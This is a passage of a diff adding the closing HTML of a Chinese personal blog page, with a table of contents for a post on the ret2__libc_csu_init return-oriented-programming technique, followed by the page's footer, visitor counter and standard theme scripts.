+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#今天又是继续学习的一天-，今天学习了中级rop的ret2-libc-csu-init"><span class="nav-number">1.</span> <span class="nav-text">今天又是继续学习的一天  ，今天学习了中级rop的ret2__libc_csu_init</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例子："><span class="nav-number">1.2.</span> <span class="nav-text">例子：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目"><span class="nav-number">1.2.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#分析"><span class="nav-number">1.2.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#思路"><span class="nav-number">1.2.3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp"><span class="nav-number">1.2.4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#56这个数的来历"><span class="nav-number">1.2.5.</span> <span class="nav-text">56这个数的来历</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#getshell-成功"><span class="nav-number">1.2.6.</span> <span class="nav-text">getshell 成功</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考文章："><span class="nav-number">1.2.7.</span> <span class="nav-text">参考文章：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">x1a0g</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
